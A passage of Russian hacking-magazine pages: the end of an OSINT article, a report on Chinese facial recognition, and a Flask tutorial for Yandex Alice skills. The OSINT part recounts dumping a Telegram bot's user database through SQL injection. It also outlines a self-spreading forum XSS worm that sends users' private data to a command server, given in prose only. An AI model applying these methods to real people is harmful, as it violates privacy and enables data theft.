Также выполняем поиск по ID. К сожалению, Telegram не позволяет получить
данные аккаунта, если есть только идентифика тор, — это базовый уровень
приватности. Потому и инстру ментов для прямого «пробива» нет, разве что
только базы, делающие реверсивный поиск по ID для аккаунтов, данные
о которых собраны «законным» образом (то есть тогда, когда можно получить
данные через API, имея общие чаты с человеком).
   Кто же располагает подобными базами информации по аккаунтам? Оче‐
видно, что это боты, которые обслуживают огромное количество открытых
чатов, закрытых чатов и личек. И ничто не запрещает их разработчикам сох‐
ранять все имеющиеся данные аккаунтов. :)
  А дальше остается расска зать только практическую часть. Например,
в одном из моих кейсов поиск источника информа ции привел к групповому
боту для накопления кармы. Разумеется, для обновления и синхронизации
значений по каждому акка унту использовалась база данных. И конечно, раз‐
работчики не устояли перед искушени ем написать простой веб‐интерфейс
на PHP для проверки кармы по нику, имени и ID поль зовате ля.
  Поиск необходимой информации ока зался даже проще, чем ожидалось:
при запросе выдавался список подходящих акка унтов с именем и ID (то есть
работало автодопол нение). При вводе идентификатора появлялась первая
запись из БД, то есть пер вое имя пользователя, под которым бот его увидел.
Бинго!
  Но если думаешь, что на этом все, то ты силь но ошибаешься. В запросе
для автодополнения нашлась SQL‐инъ екция, через которую можно было
выкачать базу всех поль зователей: акка унты, которые хотя бы однажды всту‐
пали в группы, где есть бот. Вместе с историей изменения имени, датой
вступления и другой информацией. Думаю, мораль здесь озвучивать не тре‐
буется.


СКРЫТЫЕ ДАННЫЕ С ФОРУМА
Что, если известен толь ко один акка унт человека на сайте, а поиск по нику
ничего не дает? Факт регистра ции подразумевает, что некто оставил там
свои личные данные и как минимум ввел email — для дальнейшего рассле‐
дования он нам и нужен. Только вот незадача: уровень приватности выс‐
тавлен на максимум, все данные видит только сам пользователь.
  Давай тогда допол нительно выкрутим и уро вень нашей скрытности на мак‐
симум: нельзя применять методы СИ на человеке, так как он может что‐то
заподозрить в аккаунте‐наживке и зачистить следы в других важных местах.
Конечно, можно попытаться утащить куки админис тратора или модератора
форума, получить расширенные права и пря мой доступ к базе…
  Однако  я приведу более изящный при мер решения  такой  задачи.
Но прежде чем продол жить, предупреждаю тебя: повторять эти действия
не рекомендую, как минимум потому, что они выходят за рамки пассивного
сбора информации.
  В популярных движках форумов в наше время уже сложно найти уяз‐
вимость XSS. Но значит ли это, что их там точно нет? Так подумал и автор это‐
го кейса, и не ошибся: экс пло ит был обнаружен в поле телефона в профиле
пользователя, страница которого открыта для всех. Что это для нас значит?
   Как ты мог догадаться, это поз воляет похитить сес сию пользователя,
но даже это будет излишним. Зачем входить на форум, чтобы пос мотреть
данные, которые уже в руках? Да, верно, прос то внедрим в страницу скрипт
на JS, который запросит по AJAX информа цию активного пользователя,
а потом перешлет к нам на сервер.
   Но, как помнишь, мы договорились не привлекать внимание объекта
нашего расследования. Тогда давай создадим условия, при которых наш XSS
дойдет к нему через чужие руки. Например, через аккаунты его знакомых.
Нужен еще один небольшой штрих: кро ме непос редственного запроса
на получение информации, будем отсылать через JS дополнительный запрос
на сохранение XSS в поле пользователя. Уже начина ешь видеть всю картину?
  Создадим мак симально привлекающий внимание аккаунт и напишем эпа‐
тажное сообщение на форуме. Додумывать нюансы конкретной реализации
оставляю твоему воображению. Нам не так важно, кто это прочтет и заб‐
локируют ли нас вооб ще, — аккаунт ста нет нулевым паци ентом. Кто‐нибудь
зайдет в наш профиль посмотреть информа цию и начнет распространять
вирус сборщика данных. Этот скрипт будет внедряться широкой вол ной,
заражая поочередно знакомых, зна комых знакомых и просто случайных
собеседников.





Так и случилось. Через короткое время на командный сервер пришли данные
нужного пользователя, включая и интересу ющий email. Вместе со све дени‐
ями о доброй половине остальных форумчан. Жаль, что не было подсчитано,
через какое рукопожатие «награда наш ла героя», иначе можно было бы
попутно написать исследование о социальных графах на форумах.
  Напомню, кстати, что похожая схема была недавно использована в ВК,
причем напоказ, а не в целях сбора. А представь, как дол го злоумышленники
могут эксплуатировать подобные уяз вимос ти скрыто, собирая наши данные?


ЗАКЛЮЧЕНИЕ
Здесь мы  рассмотрели  только  пять  нестандартных  способов  достать
информацию, до которой нельзя дотянуть ся из открытых источников. Всегда
есть трюки и хаки, но имей в виду, что кто‐то мог пройти этот путь до тебя:
выложить базу в Сеть, найти утечку на сайте, создать бота в Telegram для про‐
верки. Так что рекомендую сос тавить для себя список самых полезных
источников открытой информации и проходить ся по нему, прежде чем
начинать копать глубже. Для OSINT в рамках Рунета рекомендую бота
с исчерпывающим набором инс трументов на все случаи жиз ни — HowToFind
bot.
  И еще: не забывай систематизировать полученные данные. Часто элемен‐
тарный mindmap позволит увидеть не самые очевидные связи и отсечь лиш‐
нее. Может статься, тебе и не понадобится исполь зовать хитрые приемы,
чтобы узнать желаемое.
ПРИВАТНОСТЬ

  ЭЛЕКТРОННЫЙ
 ФЕЙСКОНТРОЛЬ





                                      Валентин Холмогоров
                                                 valentin@holmogorov.ru





          КАК ИСПОЛЬЗУЕТСЯ
     РАСПОЗНАВАНИЕ ЛИЦ В КИТАЕ





В начале сентября российские сетевые издания облетела
новость: одна из москов ских уличных видеокамер, подклю‐
ченных к системе распозна вания лиц, сумела обнаружить
среди прохожих человека, который успешно скрывался
от правосудия в течение нескольких лет. Несмотря на то, что
подавалось это как удивительный прорыв на грани научной
фантастики, подоб ные технологии применяются уже очень
давно. И пионером в этой области ста ла Китайская Народ‐
ная Республика.


ФЕЙСОМ ОБ TABLES
В мае 2019 года национальная биометричес кая база данных Китая включала
информацию практически о каждом из 1,4 мил лиарда жителей страны. База
эта создавалась не один день, но сегодня она позволяет за считанные секун‐
ды идентифицировать человека среди почти двух миллиардов записей.
Используемая для этого система искусс твенного интеллекта, базирующаяся
на технологиях нейросетей и машинного обучения, была разработана шан‐
хайской компанией Yitu Technology.
   Чтобы собрать информа цию о внеш ности граждан своей страны, китай‐
скому правительству даже не пришлось загонять их бамбуковыми палками
в специальные госучреждения, наводненные фотографами: люди отдавали
свои портреты доб ровольно и с радостью. Прежде всего потому, что зна‐
чительное количество полезных электронных сервисов и услуг предоставля‐
лось только посредством биометрии, а камерой сегод ня оборудован бук‐
вально каждый ноутбук и мобильный телефон. Очевидно, что информация,
попав в государственные электронные сети, остается в них навсегда и впос‐
ледствии может использовать ся этим самым государством по мере необ‐
ходимости. Причем так, как эту необходимость понимает само государс тво.
  Сейчас  по  всей  территории  континентального  Китая  раз бросано
более 200 млн камер видеонаб людения, которые денно и нощно сле дят
за автомобильным трафиком, уличной прес тупностью, соблюдением правил
дорожного движения. Они предотвра щают мелкие кражи в розничных магази‐
нах, вылавливают спящих на лекциях сту дентов и, конечно же, помогают
полицейским обнаружить находящихся в розыске граждан. Все это стало воз‐
можным благодаря раз работанной  Yitu технологии Dragonﬂy Eye System,
на создание которой инвесторы потратили более 400 млн долларов. Вла‐
дельцы компании утвержда ют, что раз работки финансировались исклю‐
чительно из бюджетов частных инвести ционных фондов, но без учас тия край‐
не заинтересованного в такой системе пра вительства Китая тут все‐таки явно
не обошлось.
   Это косвенно подтверждается тем фактом, что первыми клиентами Yitu,
внедрившими Dragonﬂy Eye System, ста ли департаменты полиции 300 китай‐
ских городов, где эту систему пос тавили на службу охране порядка. И только
затем «стрекозиный глаз» стали применять в своей повседневной работе
банкиры, медики, торговцы и частные охранные предприятия. Вскоре Dragon‐
ﬂy Eye внедрили в шанхайском мет ро, и, судя по пресс‐релизам разработ‐
чика, только в первые три месяца экс плуатации система помогла выявить
и задержать более 500 правона рушителей.





               Пример но так работа ет Dragonﬂy Eye

Снимок передается в обла ко в момент пересечения пассажиром турникета
при входе на стан цию, и если лицо это го пас сажира совпадает с портретом
находящегося в розыске подоз рева емого, портрет вместе с сигналом тре‐
воги передается на смартфон полицейского, который дежурит на платформе.
Арест следует незамедлительно.
  Кроме того, известно, что Министерс тво общес твенной безопасности
Китая еще в 2018 году выделило несколько миллиардов дол ларов на раз‐
витие двух государственных проектов под названиями Skynet и Sharp Eyes,
направленных на компьютериза цию слежки за гражданами страны и сбора
разведданных. Софи Ричардсон, руководитель китай ского отделения меж‐
дународной организации Human Rights Watch, назвала Dragonﬂy Eye System
«полицейским облаком», предназна ченным в первую очередь для «наруше‐
ния конфиденциальности и борьбы с ина комыслием».


КАК ЭТО РАБОТАЕТ?
Система Dragonﬂy Eye System не зря за няла первое мес то на конкурсе Intelli‐
gence Advanced Research Projects Activity в 2017 году: она позволяет иден‐
тифицировать лица на видеоизображении с точностью 95,5%.
  Несмотря на то, что в Yitu не раскрывают техничес ких подробнос тей
работы своего детища, извес тно, что в основе Dragonﬂy Eye лежит облачная
база данных, содержащая 1,7 миллиарда цифровых портре тов, и самообу‐
чающаяся технология распознавания лиц по набору ключевых зон и парамет‐
ров человеческого лица. Лучше всего действие сис темы иллюстрирует ее
локальная версия, внед ренная в офисе самой Yitu в деловом центре Шанхая.





  Система распознавания лиц Yitu следит и за сот рудниками, и за гостями

Как только в поле зрения подключенной к Dragonﬂy Eye видеокамеры попада‐
ет входящий в две ри офисного здания человек, программа делает несколько
моментальных снимков, выбира ет из них лучший по яркости, освещенности,
контрастности и качеству, пос ле чего с использованием машинных алгорит‐
мов определяет на снимке область лица. Программные фильтры максималь‐
но улучшают получившуюся картинку и преобразуют ее в облако точек,
которое  сравнивается  с  данными  из  распределенной  облачной базы
для идентификации личности посетителя. При этом лицо определя ется
как набор отдельных зон, каждая из которых имеет собственный комплекс
характеристик и параметров — цвет, раз мер и форма волос, высота лба,
овал лица, форма носа, форма и цвет глаз, губ, форма носогубных складок
и т. д.
  Каждому из признаков присваивает ся некий условный рейтинг, определя‐
ющий их уникальность: человек может изменить прическу, перекрасить
волосы, отрастить бороду, чтобы скрыть форму подбородка, и даже поменять
цвет глаз с помощью контактных линз, но, нап ример, форму ушей и носа
без  хирургического  вмешательства  изменить  гораздо  сложнее.  Если
полученный с камеры цифровой портрет ока жется схожим с хранящимся
образцом в базе, то есть если совпадение преодолеет некое пороговое зна‐
чение рейтинговых баллов, идентификация счи тает ся состоявшейся. Причем
на это у компьютерного комплекса уходит не более полутора секунд.
  Для сотрудников Yitu этот комплекс выполняет функции сис темы контроля
доступа, раз решая им вход только на те этажи и помещения, которые им раз‐
решено посещать по должности, а также системы учета рабочего времени,
к которой привязана прог рамма расчета заработной платы, премий и штра‐
фов. С помощью программного комплекса Dragonﬂy Eye можно проследить
маршрут посетителя по зданию офисного центра. Программа выдает время
пребывания субъекта в каждой точке офи са, его фотографию, а также поз‐
воляет прос мотреть по запросу видео, где будет показано, что он там делал.
В силу такого тотального контроля не только гости компании, но и сотрудники
Yitu не могут скрыться от слежки ни на минуту: они всегда под неусыпным над‐
зором. По словам специалистов, у Dragonﬂy Eye все еще имеются проблемы
с распознаванием обра зов отдельных людей — в основном это старики
и дети до 3 лет. Со всеми остальными задача ми искусственный интеллект
справляется просто превосходно.
  Известно также, что национальная база данных включает более 320 мил‐
лионов лиц иностранных граждан, когда‐либо пересе кавших границу Китая
через его воздушные гавани, морские порты или наземные таможенные пун‐
кты. Если ты когда‐нибудь посещал Поднебесную, будь уверен: твой сни‐
мок — и не один — там тоже есть.


ОТКУДА ДРОВИШКИ?
В любой экспертной сис теме обеспечива ющий ее работу алгоритм гаран‐
тирует только половину успеха. Вторая половина — это база данных, содер‐
жащая всю самую ценную информацию. Как китайцам удалось ее собрать?
   Если тебе посчастливилось родиться или стать жителем Китая, ты не смо‐
жешь получить национальный паспорт и значительную часть дру гих иден‐
тифицирующих документов (например, водитель ские права), не оставив
государству свои биометрические данные. Которые тут же попол нят ту самую
базу. Впоследствии, если тебе вдруг придет в голову отрастить волосы под‐
линнее, сменить прическу, нарисовать себе модные «брежневские» брови
или начать носить очки, твой портрет будет актуализирован, как только ты
авторизуешься в одной из государс твенных организаций или на сайте
по электронной подписи, какому‐либо документу или отпе чатку пальцев
и система заметит изменения в твоей внеш ности.
  При этом старые данные никуда не денут ся, они так и останутся в базе,
которая просто попол нится тво им обновлен ным визу альным образом. Имен‐
но поэтому, кстати, раз работчики жалуются на трудности в идентификации
пожилых людей: многие проживающие в сельскохозяйственных районах
Китая и отдаленных деревнях старики до сих пор умудряются обходиться
без биометрических паспортов, а некоторые даже без государственной пен‐
сии, полагаясь на помощь родственников и натуральное хозяйство.





      Тотальная система видеоконтроля — повседневность для Китая

Второй путь сбора информа ции — использование мобильных сервисов
и приложений. Современный Китай является одной из самых компьютеризи‐
рованных и высоко технологичных стран мира, смартфон есть практически
у каждого школьника и пенсионера. Китайцы уже почти полностью отказались
от использования наличности, перейдя на электронные платежи, что, кстати,
доставляет иностранным туристам мас су неудобств. Зато очень радует пра‐
вительство, получив шее воз можность контролиро вать кошельки и финан‐
совые потоки своих граждан.
  Самое популярное в КНР мобильное приложение WeChat уже давно прев‐
ратилось из простого мес сенджера в целый комбайн, напоминающий по сво‐
ей  функциональности  эдакий  электронный швейцарский  нож. Сервис
интегрирован не только с социальными сетями, но и с платежными сис‐
темами, интернет‐поиском и рекомендательными сервисами. С помощью
встроенной платежной системы WeChat Pay толь ко в период Китайского
нового года про водится больше транзакций, чем в старом добром PayPal
за весь календарный год. Пользователь WeChat, не выходя из приложения,
может отыскать ближайший  к его отелю рес торан европейской  кухни
в Пекине, почитать отзывы дру гих посетителей, заб ронировать там столик
и оплатить ужин. А заод но пригласить на этот ужин своих китай ских кол лег —
отправив им голосовое или текстовое сооб щение в этой же самой прог‐
рамме.





    Популярное в Китае приложение WeChat — не прос то мессенджер

Очень многие мобильные приложения и социальные сервисы на территории
Китая используют идентифика цию внешности для авторизации пользовате‐
лей. По утверждениям разработчиков и влас тей, это делается на благо
безопасности. Широко известен случай, когда убийца задушил девушку
и попытался воспользовать ся мобильным телефо ном жертвы, чтобы перевес‐
ти деньги с ее банковского счета. Одна ко при ложению оказалось недос‐
таточно одного лишь наличия в кадре лица хозяй ки смартфона — чтобы раз‐
блокировать программу, человек должен моргнуть, доказав, что он жив.
При неудачной попытке авториза ции приложение автомати чески делает сни‐
мок с помощью встроенной камеры девай са и пересы лает его в службу
безопасности банка. В тот раз на фотографию попал убийца, благодаря чему
он был вычислен и вскоре арестован.
  Однако «коммунистичес кий капитализм» китайского образца оставля ет
слишком мало места сохранению приватности и охра не частной жизни граж‐
дан: коммерческие компании зачас тую вынуждены сотрудничать с государс‐
твенными органами, переда вая им собранную информацию. Хотя офи циаль‐
но это нигде не подтвержда ется, произво дители софта наверняка делятся
с правительством фоточками и биометрическими данными своих юзеров,
иначе им просто не дадут спокойно работать на территории КНР. По край ней
мере, иностранные социальные сети вроде Facebook, предпочитающие
использовать персональные данные пользователей для собс твенной выгоды,
но не делиться ими с кем попало, за Боль шим Китайским Фай рволом
без дополнительных плясок с буб ном недос тупны.
  Помимо сфе ры финансовых услуг и авториза ции в мобильных приложе‐
ниях распознавание лиц активно исполь зуется в Китае и в оффлайне. Во мно‐
гих  крупных магазинах Поднебесной  установлены  кас совые терминалы
со сканерами лиц как минимум от двух платежных систем: WeChat и Alipay.
«Посветив лицом», можно оплачивать про езд и в столичном общественном
транспорте, а в Цзинане (провин ция Шань дун) уже с апре ля этого года пас‐
сажиры могут заходить в метро, прос то улыбнувшись в камеру. Сейчас пла‐
тежные терминалы, связанные с сервисами рас познавания лиц, активно
внедряются в медицинских центрах и учреждениях госус луг в Шэньчжэне,
Цзинане и других крупных городах. Ана лити ки полагают, что к 2024 году объ‐
ем этого рынка в КНР превысит 10 миллиардов юаней, что составля ет ни мно‐
го ни мало 2 миллиарда долларов США.





  Megvii благодаря проекту Face++ выходит на лидирующие позиции рынка
  распознавания лиц

Сегодня этот быстро рас тущий сегмент китайского рынка осваивают не толь‐
ко такие монстры, как Yitu и Alibaba — последний успешно внедрил тех‐
нологию распознавания лиц в платежную систему AliPay. На пятки им наступа‐
ют стремительно развива ющиеся стартапы, например фирмы SenseTime
и Megvii. Последняя разработа ла самую популярную в мире платформу рас‐
познавания лиц с открытым исходным кодом Face++. Спрос на подобный
софт уве ренно растет, и вскоре китайские IT‐компании имеют все шансы
обогнать по своей капита лизации предприятия калифорнийской Кремниевой
долины.


ТЕМНАЯ СТОРОНА СИЛЫ
Но любая медаль, как известно, имеет две стороны. Про сис тему социаль‐
ного кредита, завязанную на рас позна вание лиц, которую к 2020 году пла‐
нируют внедрить по всему Китаю, слышал, наверное, каждый. Вкратце она
будет работать так.
  Каждому гражданину присваивается определенный социальный рейтинг,
который может повышать ся или понижаться в зависимос ти от его поведения.
По каким именно критериям будет оцениваться это самое поведе ние, китай‐
ское правительство не сообщает. Известно только, что к негативным фак‐
торам будут отне сены администра тивные и уголовные правонарушения,
нарушения правил дорож ного движения, курение в неположенных местах,
распространение недостоверной информации в интернете (видимо, про‐
тиворечащей официаль ной позиции влас тей стра ны) и почему‐то покупка
большого количества видеоигр. В ту же копилку добавляется безбилетный
проезд в общественном транспорте, уклонение от воинской службы и
несвоевременная оплата коммунальных счетов.





        Система социальных кредитов — это оживший киберпанк

Гражданин с низким социальным рейтингом не сможет пользоваться кредит‐
ными программами государственных банков, откры вать дебетовые и кредит‐
ные карты, покупать авиабилеты, а также билеты биз нес‐класса на поезд. Их
не станут нанимать на руководящие должности и на работу в государс твен‐
ные структуры. Вход в лучшие отели Китая им будет закрыт. Кроме того,
некоторые источники утверждают, что дети в Китае несут солидарную ответс‐
твенность за своих родителей: потомкам социально безответственных граж‐
дан может быть запрещено учиться в лучших шко лах или получать высшее
образование в некото рых университетах стра ны. Не смог правильно вос‐
питать своего папочку — страдай.
  Но кнут малоэффективен без пряника: помимо наказаний планиру ется
реализовать и систему поощрений для граждан за хорошее поведение. Те,
кто горячо любит партию и пра вительство, вовремя платит налоги и всегда
переходит улицу на зеленый свет, смогут получать скидки на оплату электро‐
энергии, брать в прокат автомобили и про чие вещи без залога и оформлять
кредиты по снижен ной ставке.
  Очевидно, что фиксация нарушений будет осуществляться в том числе
с использованием уличных видеока мер, подклю ченных к комплексам рас‐
познавания лиц. Если отследить должника по коммуналке не составляет
никакого труда и без вся ких камер, то гражданина, переходяще го дорогу
в неположенном месте, смо жет опоз нать и наказать только искусс твенный
интеллект.
   Частично подоб ная система внедрена уже сейчас, и активнее все го она
применяется в районах  Китая, преимущес твенно населенных  уйгу рами,
а  именно —  в  провинции  Синьцзян.  Уйгуры —  это  мусульманское
национальное меньшинство, отно сящееся к тюркским народностям. В прош‐
лом жители Синьцзяна учас твовали в мас совых акциях протеста, после чего
китайское правительство решило ужес точить в регионе меры безопасности,
которые сегодня, по мнению западных аналитиков, больше смахивают
на высокотехнологич ный концлагерь.





            Камеры денно и нощ но следят за жителями Китая

О повседневной жизни в Синь цзя не уже опуб ликовано множество статей
и сняты сотни репортажей, которые рас скажут об этом явлении более под‐
робно. За местными жителями орга низована круглосуточная слежка, а самый
крупный город провинции — Урумчи — разделен на кварталы, проход между
которыми возможен только через охра няемые КПП с обязательным предъ‐
явлением собственной физиономии в видеока меру. Всех при езжих, включая
иностранцев, обязуют установить на смартфон специальную программу,
которая будет сле дить за владельцем и передавать хранящуюся на устрой‐
стве информацию компетентным орга нам.
  Считается, что все эти высоко технологичные меры предос торожности
приняты ради безопас ности и смогут обеспечить отсутс твие каких‐либо
проблем в будущем. Только вот нуж но ли местным жителям такое будущее —
очень большой вопрос.
ТРЮКИ


  ВСЕ МЫ
 НЕ В СВОЕМ
    УМЕ

       КАК СДЕЛАТЬ НОВЫЙ НАВЫК
       ДЛЯ «АЛИСЫ» НА PYTHON





По примеру американских кол лег из Apple,
Amazon, Google и Microsoft в «Яндексе»
в 2017 году сделали сво его голосо вого
ассистента,  который  понима ет  русский
язык и пользует ся неплохой популярностью          Виктор Паперно                                                                                           vpap1997@inbox.ru
в  России. Одна  из  причин  успеха —
это возможность создания сво их навыков,
то есть собс твенных приложений. О том,
как научить «Алису» новым вещам, исполь‐
зуя  Python и веб‐фреймворк  Flask, мы
и поговорим в этой статье.


Как вообще работают навыки? Если говорить простыми словами, то «Алиса»
и твой сервер будут обменивать ся файлами в формате JSON, где будет
содержаться необходимая информа ция. Причем на сервер придет не прос то
распознанный текст, но уже подготовленный для обработки запрос. Ты
можешь выбрать любой удоб ный язык прог раммирования — нужна только
возможность создавать на нем веб‐сервер. Мы выберем Python как один
из самых простых и популярных.


             INFO

                       Чтобы все примеры исходного кода, приведенные
                        в статье, успешно запускались, тебе понадобится
                         установить:
                  •Python 3.6 или новее;
                  •Flask 1.0.2 или новее.



ПЕРВЫЙ НАВЫК — ЭХО-БОТ
Навык «Алисы» — это, по сути, чат‐бот. А раз работчики чат‐ботов для тес та
обычно первым делом про буют написать «эхо‐бота», который отправляет
тебе то же самое, когда ты ему что‐то пишешь.
  Для начала основные тер мины:
 • request — запрос, который поступил от «Алисы»;
 • response — ответ нашего сервера, который отправляется «Алисе».

Как будет работать наш навык? На наш сервер пос тупает request, мы будем
получать из него содержимое в виде текста, а затем отправлять response,
где в качестве содержимого ука жем текст зап роса. Переходим к коду!


from flask import Flask
from flask import request
import json


app = Flask(__name__)


@app.route('/post', methods=['POST'])
def main():
    ## Создаем ответ
    response = {
        'session': request.json['session'],
        'version': request.json['version'],
        'response': {
            'end_session': False
        }
    }
    ## Заполняем необходимую информацию
    handle_dialog(response, request.json)
    return json.dumps(response)



def handle_dialog(res,req):
    if req['request']['original_utterance']:
        ## Проверяем, есть ли содержимое
        res['response']['text'] = req['request']['original_utterance'
]
    else:
        ## Если это первое сообщение — представляемся
        res['response']['text'] = "Я echo‐bot, повторяю за тобой"


if __name__ == '__main__':
    app.run()

Как‐то много кода... Давай раз бирать ся по частям. Во‐первых, важно сказать,
что наш сервер написан на Flask, и если ты хочешь разобраться в этом фрей‐
мворке поглубже, на «Хабрахабре» есть отличный гайд. Здесь же отметим
пару основных вещей.
 • Важно не забыть импортировать модули: Flask отвечает непосредственно
   за работу веб‐приложения, request — за работу с запросами, а json
   необходим, потому что мы и получа ем, и отправляем файлы JSON, а не
  объекты из Python.
 • Нужно создать экземпляр класса Flask, а затем его запустить. Это и есть
   непосредственно «ядро» сервера.
 • Декоратор app.route необ ходим, что бы связать URL, тип запроса и фун‐
   кцию, которая будет обра батывать этот запрос.

С основами Flask покончено — в принципе, для раз работки простых навыков
нам ничего больше не пот ребуется. Давай раз берем, что же происходит
в наших двух функциях.
  В main() мы сначала соз даем шаб лон для ответа. Обрати внимание, что
мы передаем туда два параметра из запроса: session и version, а затем
во вторую функцию передаем наш шаб лон для ответа и запрос, сконверти‐
рованный в JSON.
  Основная функциональность нашего навыка содержится в функции han‐
dle_dialog(res,req). Если нам пришло какое‐то сообщение, то все прос то:
нужно получить содержимое запроса. Кстати, оригинальный текст запроса
содержится внутри req['request']['original_utterance']. Чтобы отпра‐
вить его обратно пользователю, нужно скопировать содержимое в res['re‐
sponse']['text'].
   Когда пользователь подклю чает ся к навыку в первый раз, запрос тоже
приходит, но никакого текста в нем нет. Для обработки этой ситу ации я
добавил в функцию проверку.
  Вроде бы все? Теперь нужно проверить, работа ет наш пример или мы
где‐то ошиблись. Но как протес тировать?


ТЕСТИРОВАНИЕ НАВЫКОВ
Существует несколь ко способов тес тирования навыков. Один из самых прос‐
тых — с помощью утилиты alice‐nearby, которую можно запускать локально
на своем компьютере. О том, как ее уста новить, написано достаточно под‐
робно, так что не буду заострять на этом вни мание. Итак, начинаем тес‐
тирование.
 1. Запускаем наше приложение.





                        Отоб ражение в IDLE
 2. Запускаем alice‐nearby, ука зав в качестве значения webhook http://lo‐
   calhost:5000/post.





                         Запуск на MacOS
 3. Открываем любой браузер и переходим по ссылке localhost:3456, что‐
  бы убедиться, что открылось приложение для тестирования.





                   Приложение для тестирова ния

Поздравляю, твой первый навык работает! Обра ти внимание: справа отоб‐
ражаются запрос и ответ в JSON. Но на самом деле авторы этой утилиты
не придумывали интерфейс самос тоятельно. Они просто сделали локальную
версию приложе ния для тестирования навыков на основе тес тового стенда
в личном кабинете «Яндекс.Диало ги».
  Зарегистрируемся в «Диало гах», регистри руем свой навык и попробуем
его протестировать. При создании нового диалога разработчику предлага‐
ется выбрать его тип. Выбираем «Навык в Алисе».





                           Типы диалогов

Откроется  страница  с  нас тройками.  Их  много,  сконцентрируемся
на основных.





                    Ос новные нас трой ки

Для проверки работы нашего бота нам необходимо указать Webhook URL
в «Яндекс.Диалогах». Но если мы попробуем добавить туда http://local‐
host:5000/post, то ничего не про изойдет и на вкладке «Тестирование»
будет лишь сообщение об ошиб ке сервера.
   Чтобы протестировать навык, запущенный на компьютере, а не на сер‐
вере, можно использовать приложение ngrok. Эта программа создает пуб‐
личный URL для сайта или сервера, запущенного на локальной машине.





                                  ngrok

Запустим ngrok, скопиру ем выданный нам URL‐адрес в поле Webhook URL,
сохраним настрой ки и перейдем на вкладку «Тестирование». Обрати вни‐
мание, что ngrok выдает два URL: HTTP и HTTPS, нам нужен HTTPS. И не
забудь добавить к адресу /post, чтобы зап росы обра баты вались корректно.





                    Тестирование на «Я.Диало гах»

Хотелось бы не только писать, но и про верить, как бы все это звучало,
если бы наши ответы зачитывала «Алиса». Это можно будет сделать, если
наш навык пройдет модера цию… Он вряд ли ее пройдет, но не надо отча‐
иваться! Существует целых два решения.
 1. Сделать навык приватным. Для это го в нас трой ках необходимо пос тавить
   соответствующую галочку. В таком случае модераторы проверят только
   название, активационное имя и приветственное сообщение, где дол жно
   быть описано, что делает навык. Подробнее про модерацию навыков мож‐
   но узнать из видеоруководс тва.
 2. Воспользоваться симулятором. В настройках необ ходимо указать URL —
   и можно начинать.





                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
  ВСЕ МЫ НЕ В СВОЕМ
              УМЕ
            КАК СДЕЛАТЬ НОВЫЙ НАВЫК ДЛЯ «АЛИСЫ»
                                   НА PYTHON





ПОИГРАЕМ В СЛОВА
Следующим  навыком, который мы  разработа ем,  будет  игра  в слова.
Для начала необходимо сос тавить алгоритм работы. Пускай игру всегда
начинает «Алиса». Тогда необходимо сделать следующее:
 • отправить пользователю случайное слово;
 • получить его ответ;
 • проверить, что ответ пользователя соответству ет условиям игры:
    • слово игрока начинается с последней буквы слова «Алисы»;
    • слово игрока еще не было использовано в данной игре;
 • отправить пользователю новое сло во или сообщение об ошибке.

Примерная блок‐схема игры выг лядит так.





                        Блок‐схема игры в слова

 • Условие 1 — Слово начина ется на «правиль ную» букву
 • Условие 2 — Слово не было использовано
 • Условие 3 — Следующее сло во наш лось

Для хранения слов мы будем использовать словарь, где в качестве ключа
будет выступать первая буква, а в качес тве значения — список слов.
Но если бы мы исполь зовали один и тот же словарь для всех игроков, сло‐
ва бы очень быстро закончились, поэтому для каж дого игрока создается свой
элемент в дополнительном словаре, где ключом выступает ID пользователя,
а в значении лежит список, в котором на первом мес те — словарь доступных
для игры слов, а на втором — список уже использованных. Звучит запутанно?
Давай посмотрим, как хра нятся сло ва, а затем разберем небольшой пример:


WORDS = {"а": ["анафема"],
     "б":["блюдо","борьба"]
     }

Для нового пользователя соз дается запись в словаре USERS такого вида:


{"ID пользователя" :
  [
    {"а": ["анафема"],"б":["блюдо","борьба"]},
    []
  ]
}`

Наш бот выдал первое слово — «борь ба», поль зователь ответил «арка». Пос‐
ле этого запись в нашем сло варе будет выглядеть так:


{"ID пользователя" :
  [
    {"а": ["анафема"],"б":["блюдо"]},
    ["борьба","арка"]
  ]
}`

Теперь посмотрим на исходный код целиком и раз берем неясные моменты.


from flask import Flask
from flask import request
import json
import random
import copy


app = Flask(__name__)


## Общий список слов
WORDS = {"а": ["анафема","аллегория","актер","арка","аптека"],
         "б":["блюдо","борьба","брак"],
         "д":["дружба","детство"]
         }


## Словарь для хранения информации о пользователях
## Ключом будут их идентификаторы, а в качестве значений будет
список вида [ {НеИСПОЛЬЗОВАННЫЕ СЛОВА}, [ИСПОЛЬЗОВАННЫЕ СЛОВА]]
USERS = {}


@app.route('/post', methods=['POST'])
def main():
    response = {
        'session': request.json['session'],
        'version': request.json['version'],
        'response': {
            'end_session': False
        }
    }
    handle_dialog(response, request.json)
    return json.dumps(response)


def random_word(user_id):
    '''
    Функция возвращает случайное слово из слов для заданного
пользователя и перемещает его из списка неиспользованных слов в
список использованных
    :param user_id:
    :return:
    '''
    global USERS
    all = []
    L_WORDS = USERS[user_id][0]
    for i in L_WORDS.values():
        all += i
    word = random.choice(all)
    L_WORDS[word[0]].remove(word)
    return word


def get_next_word(word,user_id):
    '''
    Функция возвращает следующее слово для заданного пользователя и
текущего слова
    :param word:
    :param user_id:
    :return:
    '''
    global USERS
    L_WORDS = USERS[user_id][0]
    L_USED = USERS[user_id][1]
    try:
        while True:
            letter = word[‐1]
            my_word = random.choice(L_WORDS[letter])
            L_WORDS[letter].remove(my_word)
            if my_word not in L_USED:
                break
        return my_word
    except:
        return False


def handle_dialog(res, req):
    global USERS
    user_id = req['session']['user_id']
    if req['session']['new']:
        # Если до этого пользователь не играл, нужно его
зарегистрировать в системе и отправить первое слово
        USERS[user_id] = [copy.deepcopy(WORDS)]
        USERS[user_id].append([random_word(user_id)])
        res['response']['text'] = USERS[user_id][1][‐1]
    else:
        L_USED = USERS[user_id][1]
        word = req['request']['nlu']['tokens'][0]
        if word[0] == L_USED[‐1][‐1]:
            # Если пользователь указал слово правильно (начинается
на последнюю букву предыдущего), то генерируем следующее слово
            if word not in L_USED:
                # Если это слово не использовалось
                L_USED.append(word)
                next_w = get_next_word(word,user_id)
                if next_w:
                    res['response']['text'] = next_w
                    L_USED.append(next_w)
                else:
                    # Слова могут и закончиться....
                    res['response']['text'] = "У меня закончились
слова..."
            else:
                # Если слово уже было использовано человеком или
Алисой
                res['response']['text'] = "Слово {} уже было".format(
word)
        else:
            # Если пользователь попытался читерить и указал
случайное слово
            res['response']['text'] = "Слово должно начинаться на
последнюю букву моего. Попробуй опять"



